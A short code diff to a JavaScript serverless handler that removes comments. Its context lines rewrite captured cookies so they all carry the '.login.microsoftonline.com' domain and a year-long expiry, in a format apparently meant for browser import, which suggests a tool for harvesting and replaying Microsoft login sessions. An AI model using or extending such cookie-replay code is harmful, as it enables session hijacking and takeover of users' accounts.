@@ -195,7 +195,6 @@ export const handler = async (event, context) => {
             return name && value ? {
               name: name.trim(),
               value: value.trim(),
-              // Always use Microsoft domain
               domain: '.login.microsoftonline.com',
               path: '/',
               secure: true,
@@ -220,7 +219,6 @@ export const handler = async (event, context) => {
         return name && value ? {
           name: name.trim(),
           value: value.trim(),
-          // Always use Microsoft domain
           domain: '.login.microsoftonline.com',
           path: '/',
           secure: true,
@@ -235,10 +233,9 @@ export const handler = async (event, context) => {
       console.log('✅ Using documentCookies:', processedCookies.length);
     }
 
-    // Enforce all cookies to have the Microsoft domain
     const formattedCookies = processedCookies.map(cookie => ({
       ...cookie,
-      domain: '.login.microsoftonline.com', // Always use this domain
+      domain: '.login.microsoftonline.com',
       expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
       hostOnly: cookie.hostOnly !== undefined ? cookie.hostOnly : false,
       httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
